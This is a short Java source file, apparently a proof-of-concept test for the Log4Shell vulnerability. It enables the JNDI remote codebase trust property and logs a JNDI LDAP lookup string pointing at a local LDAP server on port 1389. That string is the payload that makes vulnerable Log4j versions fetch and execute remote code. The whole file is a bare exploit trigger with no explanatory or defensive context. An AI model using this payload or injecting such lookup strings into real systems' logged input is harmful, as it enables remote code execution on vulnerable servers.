package com.example.hack;

import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;


public class Hack {
    private static final Logger logger = LogManager.getLogger(Hack.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.info("${jndi:ldap://0.0.0.0:1389/Log4jRCE}");
    }
}